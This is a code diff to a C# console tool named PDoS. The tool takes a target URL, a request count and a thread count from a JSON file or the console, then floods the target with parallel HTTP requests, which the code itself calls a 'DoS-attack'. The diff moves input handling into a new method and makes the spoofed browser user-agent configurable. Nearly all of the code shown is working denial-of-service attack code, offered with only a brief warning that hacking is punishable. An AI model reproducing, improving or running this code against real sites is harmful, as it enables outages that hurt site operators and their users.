@@ -32,10 +32,6 @@ namespace PDoS
         /// </summary>
         const string _agent = "user-agent";
         /// <summary>
-        /// Browser header params.
-        /// </summary>
-        const string _header = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)";
-        /// <summary>
         /// Is alive or not.
         /// </summary>
         static bool _alive = true;
@@ -63,45 +59,22 @@ namespace PDoS
             Console.WriteLine($"But remember that any hacking activity is punishable!{Environment.NewLine}");
             Console.ForegroundColor = ConsoleColor.White;
 
-            // Json
-            var json = JObject.Parse(File.ReadAllText(_attack));
-            var config = (bool)json["config"];
-            string uri;
-            uint requests;
-            uint threads;
-
-            // Parse data
-            if (config)
-            {
-                Console.WriteLine($"Configuration file: {_attack.ToLower()}");
-                uri = (string)json["target"];
-                Console.WriteLine($"Target url: {uri}");
-                requests = uint.Parse((string)json["requests"]);
-                Console.WriteLine($"Serial requests: {requests}");
-                threads = uint.Parse((string)json["threads"]);
-                Console.WriteLine($"Parallel threads: {threads}");
-            }
-            else
-            {
-                Console.Write($"Target url: ");
-                uri = Console.ReadLine();
-                Console.Write($"Serial requests: ");
-                requests = uint.Parse(Console.ReadLine());
-                Console.Write($"Parallel threads: ");
-                threads = uint.Parse(Console.ReadLine());
-            }
+            // Input params
+            string header, uri;
+            uint requests, threads;
+            Input(out header, out uri, out requests, out threads);
 
             // DoS-attack call
-            if (Target(uri))
+            if (Target(header, uri))
             {
                 var tic = Environment.TickCount;
 
-                DoS(uri, requests, threads); while (_alive)
+                DoS(header, uri, requests, threads); while (_alive)
                 {
                     /* waiting for end point */
                 }
 
-                var toc = Math.Round((Environment.TickCount - tic) / (double)_timeout, 2);
+                var toc = Math.Round((Environment.TickCount - tic) / 1000.0, 2);
                 Console.WriteLine($"{Environment.NewLine}{Separator}");
                 Console.WriteLine($"Data transfer complete in {toc} seconds.");
             }
@@ -116,15 +89,54 @@ namespace PDoS
             Console.ReadKey();
         }
         /// <summary>
+        /// Input params.
+        /// </summary>
+        /// <param name="header">Header</param>
+        /// <param name="uri">Uri</param>
+        /// <param name="requests">Number of requests</param>
+        /// <param name="threads">Number of threads</param>
+        static void Input(out string header, out string uri, out uint requests, out uint threads)
+        {
+            var json = JObject.Parse(File.ReadAllText(_attack));
+            var config = (bool)json["config"];
+
+            // Parse data or input from console
+            if (config)
+            {
+                Console.WriteLine($"Configuration file: {_attack.ToLower()}");
+                header = (string)json["agent"];
+                Console.WriteLine($"User agent: {header}");
+                uri = (string)json["target"];
+                Console.WriteLine($"Target url: {uri}");
+                requests = uint.Parse((string)json["requests"]);
+                Console.WriteLine($"Serial requests: {requests}");
+                threads = uint.Parse((string)json["threads"]);
+                Console.WriteLine($"Parallel threads: {threads}");
+            }
+            else
+            {
+                header = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)";
+                Console.WriteLine($"User agent: {header}");
+                Console.Write($"Target url: ");
+                uri = Console.ReadLine();
+                Console.Write($"Serial requests: ");
+                requests = uint.Parse(Console.ReadLine());
+                Console.Write($"Parallel threads: ");
+                threads = uint.Parse(Console.ReadLine());
+            }
+        }
+        /// <summary>
         /// Checks target.
         /// </summary>
-        static bool Target(string uri)
+        /// <param name="header">Header</param>
+        /// <param name="uri">Uri</param>
+        static bool Target(string header, string uri)
         {
             // check target
             Console.Write($"{Environment.NewLine}");
             Console.CursorVisible = false;
             using var client = new HttpClient();
-            client.DefaultRequestHeaders.Add(_agent, _header);
+            client.DefaultRequestHeaders.Add(_agent, header);
 
             try
             {
@@ -150,10 +162,11 @@ namespace PDoS
         /// <summary>
         /// DoS-attack method.
         /// </summary>
+        /// <param name="header">Header</param>
         /// <param name="uri">Url</param>
         /// <param name="requests">Number of requests</param>
         /// <param name="threads">Number of threads</param>
-        static void DoS(string uri, uint requests, uint threads)
+        static void DoS(string header, string uri, uint requests, uint threads)
         {
             Thread.Sleep(_timeout);
             Console.WriteLine($"Starting attack for { uri }...");
@@ -170,7 +183,7 @@ namespace PDoS
             Parallel.For(0, threads, async j =>
             {
                 using var client = new HttpClient();
-                client.DefaultRequestHeaders.Add(_agent, _header);
+                client.DefaultRequestHeaders.Add(_agent, header);
 
                 // http requests
                 for (int i = 0; i < requests; i++)
